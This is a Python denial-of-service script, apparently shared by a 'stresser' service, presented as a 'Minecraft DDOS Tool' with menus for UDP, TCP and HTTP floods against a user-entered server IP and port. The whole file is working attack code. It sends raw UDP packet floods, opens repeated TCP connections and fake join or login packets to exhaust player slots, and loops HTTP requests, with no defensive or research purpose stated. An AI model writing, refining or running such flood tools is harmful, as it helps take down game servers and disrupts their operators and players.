import socket
import random
import time
import requests
from colorama import init, Fore

# Initialize Colorama
init(autoreset=True)

# Set window title
print(f"\033]0;Minecraft DDOS Tool V2 By elitestresser.club\007", end="", flush=True)

# ASCII Art
ASCII_ART = """
  __  __       _                          _     _____  _____   _____ 
 |  \/  |     (_)                        | |   |  __ \|  __ \ /     |
 | \  / | __ _ _ _ __  _ __   __ _ _ __ | |_  | |  | | |  | |  |  | 
 | |\/| |/ _` | | '_ \| '_ \ / _` | '_ \| __| | |  | | |  | |  |  | 
 | |  | | (_| | | | | | | | | (_| | | | | |_  | |__| | |__| |  |  | 
 |_|  |_|__,_|_|_| |_|_| |_|__,_|_| |_|__| |_____/|_____/ ______|
       Minecraft DDOS Tool V2 - Made by elitestresser.club
"""

# Layer 4 UDP Methods (Minecraft-specific)
def udp_spam(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = random.randbytes(packet_size)
    print(Fore.CYAN + f"[🚀] UDP Spam on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))  # Overwhelm Minecraft UDP (if enabled)
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

def udp_handshake(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    handshake = bytes([0x00, 0x00]) + random.randbytes(packet_size - 2)  # Fake handshake
    print(Fore.CYAN + f"[🚀] UDP Handshake Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock.sendto(handshake, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

def udp_query(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    query = bytes([0xFE, 0x01]) + random.randbytes(packet_size - 2)  # Minecraft query flood
    print(Fore.CYAN + f"[🚀] UDP Query Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock.sendto(query, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} query packets.")

# Layer 4 TCP Methods (Minecraft-specific)
def tcp_connect(ip, port, duration, packet_size):
    end_time = time.time() + duration
    connection_count = 0
    print(Fore.CYAN + f"[🚀] TCP Connect Flood on {ip}:{port} | {duration}s...")
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect_ex((ip, port))  # Exhaust player slots
            connection_count += 1
            sock.close()
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    print(Fore.GREEN + f"[✅] Done! Made {connection_count} connections.")

def tcp_join(ip, port, duration, packet_size):
    end_time = time.time() + duration
    packet_count = 0
    handshake = bytes([0x00, 0x00, 0xFF, 0xFF]) + random.randbytes(packet_size - 4)  # Fake join
    print(Fore.CYAN + f"[🚀] TCP Join Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(handshake)
            packet_count += 1
            sock.close()
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    print(Fore.GREEN + f"[✅] Done! Sent {packet_count} join packets.")

def tcp_login(ip, port, duration, packet_size):
    end_time = time.time() + duration
    packet_count = 0
    login = bytes([0x02, 0x00, 0x07]) + b"BotUser" + random.randbytes(packet_size - 12)  # Fake login
    print(Fore.CYAN + f"[🚀] TCP Login Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(login)
            packet_count += 1
            sock.close()
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    print(Fore.GREEN + f"[✅] Done! Sent {packet_count} login attempts.")

# Layer 7 HTTP Methods (Minecraft-specific resource drain)
def http_status_flood(ip, duration):
    end_time = time.time() + duration
    request_count = 0
    url = f"http://{ip}:25565/status"  # Common Minecraft web status endpoint
    print(Fore.CYAN + f"[🚀] HTTP Status Flood on {url} | {duration}s...")
    try:
        while time.time() < end_time:
            requests.get(url, timeout=1)  # Flood server status page
            request_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    print(Fore.GREEN + f"[✅] Done! Sent {request_count} status requests.")

def http_query_flood(ip, duration):
    end_time = time.time() + duration
    request_count = 0
    url = f"http://{ip}:25565/query"  # Common Minecraft query endpoint
    print(Fore.CYAN + f"[🚀] HTTP Query Flood on {url} | {duration}s...")
    try:
        while time.time() < end_time:
            requests.get(url, timeout=1)  # Overload query system via HTTP
            request_count += 1
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    print(Fore.GREEN + f"[✅] Done! Sent {request_count} query requests.")

# Validation Function
def validate_input(prompt, min_val, max_val, input_type=int, default=None):
    while True:
        try:
            value = input(Fore.LIGHTBLUE_EX + prompt)
            if value == "" and default is not None:
                return default
            value = input_type(value)
            if min_val <= value <= max_val:
                return value
            print(Fore.RED + f"[❌] Must be between {min_val} and {max_val}!")
        except ValueError:
            print(Fore.RED + "[❌] Invalid input! Numbers only.")

# Main Menu
def main():
    print(Fore.YELLOW + ASCII_ART)
    print(Fore.LIGHTBLUE_EX + "🔹 Minecraft Attack Methods 🔹")
    print("  1. Layer 4 UDP")
    print("  2. Layer 4 TCP")
    print("  3. Layer 7 HTTP")
    attack_type = input(Fore.LIGHTBLUE_EX + "Select attack type (1-3): ").strip()

    ip = input(Fore.LIGHTBLUE_EX + "Enter Minecraft server IP: ")
    port = validate_input("Enter port (default 25565): ", 1, 65535, default=25565)
    duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float)

    if attack_type == "1":  # Layer 4 UDP
        print(Fore.LIGHTBLUE_EX + "\n🔹 Layer 4 UDP Methods 🔹")
        print("  1. UDP Spam  2. UDP Handshake  3. UDP Query")
        method = input(Fore.LIGHTBLUE_EX + "Select method (1-3): ").strip()
        packet_size = validate_input("Enter packet size (1-65500): ", 1, 65500)

        methods = {
            "1": udp_spam, "2": udp_handshake, "3": udp_query
        }
        if method in methods:
            methods[method](ip, port, duration, packet_size)
        else:
            print(Fore.RED + "[❌] Invalid UDP method!")

    elif attack_type == "2":  # Layer 4 TCP
        print(Fore.LIGHTBLUE_EX + "\n🔹 Layer 4 TCP Methods 🔹")
        print("  1. TCP Connect  2. TCP Join  3. TCP Login")
        method = input(Fore.LIGHTBLUE_EX + "Select method (1-3): ").strip()
        packet_size = validate_input("Enter packet size (1-65500): ", 1, 65500)

        methods = {
            "1": tcp_connect, "2": tcp_join, "3": tcp_login
        }
        if method in methods:
            methods[method](ip, port, duration, packet_size)
        else:
            print(Fore.RED + "[❌] Invalid TCP method!")

    elif attack_type == "3":  # Layer 7 HTTP
        print(Fore.LIGHTBLUE_EX + "\n🔹 Layer 7 HTTP Methods 🔹")
        print("  1. HTTP Status Flood  2. HTTP Query Flood")
        method = input(Fore.LIGHTBLUE_EX + "Select method (1-2): ").strip()

        methods = {
            "1": http_status_flood, "2": http_query_flood
        }
        if method in methods:
            methods[method](ip, duration)
        else:
            print(Fore.RED + "[❌] Invalid HTTP method!")

    else:
        print(Fore.RED + "[❌] Invalid attack type!")

if __name__ == "__main__":
    main()
